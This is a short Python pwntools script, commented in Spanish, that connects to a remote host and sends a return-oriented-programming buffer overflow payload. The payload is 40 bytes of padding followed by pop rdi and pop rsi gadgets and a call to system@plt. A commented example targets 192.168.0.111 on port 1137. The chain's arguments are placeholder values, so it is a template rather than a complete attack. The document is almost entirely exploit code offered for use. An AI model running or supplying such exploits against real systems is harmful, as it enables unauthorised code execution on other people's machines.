from pwn import *
'''
Función que se conecta a un objetivo en una 
dirección IP y puerto específicos. Esta 
función utiliza gadgets ROP para construir 
un payload que se envía al objetivo. El 
objetivo procesa el payload y devuelve una 
respuesta que se muestra en la STDOUT.
'''


def rop_exploit(target, port):
    conn = remote(target, port)

    pop_rdi = p64(0x400683)
    pop_rsi_r15 = p64(0x400681)
    system_plt = p64(0x4004e0)

    payload = b'A' * 40
    payload += pop_rdi
    payload += p64(0xdeadbeef)
    payload += pop_rsi_r15
    payload += p64(0xcafebabe)
    payload += b'B' * 8
    payload += system_plt

    conn.sendline(payload)

    response = conn.recvall()
    print(response)

    conn.close()

'''Ejemplo de uso:

rop_exploit("192.168.0.111", 1137)
'''